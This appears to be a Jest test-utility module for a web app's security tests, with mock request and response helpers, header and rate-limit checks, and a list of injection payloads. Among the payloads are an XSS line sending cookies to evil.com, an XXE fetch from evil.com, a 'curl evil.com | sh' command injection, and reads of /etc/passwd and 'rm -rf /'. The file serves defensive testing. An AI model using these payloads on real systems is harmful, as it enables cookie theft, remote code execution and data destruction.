import jwt from 'jsonwebtoken';

export function generateTestToken(role: string = 'admin'): string {
  return jwt.sign(
    { id: 'test-user', email: 'test@test.com', role },
    process.env.JWT_SECRET || 'test-secret',
    { expiresIn: '1h' }
  );
}

export const maliciousPayloads = {
  sql: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1' AND '1' = '1",
    "' OR EXISTS(SELECT * FROM users WHERE email='admin@test.com') AND ''='",
    "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --"
  ],
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>'
  ],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious">]><foo>&xxe;</foo>'
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd'
  ],
  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '`rm -rf /`',
    '$(curl http://evil.com/malicious.sh | sh)'
  ]
};

export function createMockRequest(overrides: any = {}) {
  return {
    headers: {},
    body: {},
    params: {},
    query: {},
    cookies: {},
    ip: '127.0.0.1',
    method: 'GET',
    path: '/',
    ...overrides
  };
}

export function createMockResponse() {
  const res: any = {
    status: jest.fn().mockReturnThis(),
    json: jest.fn().mockReturnThis(),
    send: jest.fn().mockReturnThis(),
    setHeader: jest.fn().mockReturnThis(),
    cookie: jest.fn().mockReturnThis(),
  };
  return res;
}

export function expectSecureHeaders(response: any) {
  expect(response.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
  expect(response.setHeader).toHaveBeenCalledWith('X-Frame-Options', 'DENY');
  expect(response.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
  expect(response.setHeader).toHaveBeenCalledWith('Strict-Transport-Security', expect.any(String));
}

export async function testRateLimiting(endpoint: string, method: string = 'POST', limit: number = 5) {
  const attempts = Array(limit + 1).fill(null);
  const responses = [];
  
  for (const _ of attempts) {
    const response = await fetch(endpoint, {
      method,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ test: 'data' })
    });
    responses.push(response);
  }
  
  const lastResponse = responses[responses.length - 1];
  expect(lastResponse.status).toBe(429);
  
  return responses;
}